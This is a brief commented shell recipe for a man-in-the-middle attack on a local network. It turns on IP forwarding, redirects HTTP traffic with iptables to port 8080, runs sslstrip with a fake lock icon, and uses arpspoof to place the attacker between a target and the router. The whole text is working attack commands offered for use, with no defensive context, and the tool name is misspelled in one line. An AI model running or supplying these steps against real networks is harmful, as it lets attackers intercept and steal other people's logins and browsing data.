# Flip your machine into forwarding mode (as root):
echo "1" > /proc/sys/net/ipv4/ip_forward
# Setup iptables to intercept HTTP requests (as root):
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
# Enable sslstrip to redirect stripped data to 8080
sslstip.py -l 8080 -f lock.ico
# Run arpspoof to redirect traffic to your machine (as root):
arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>
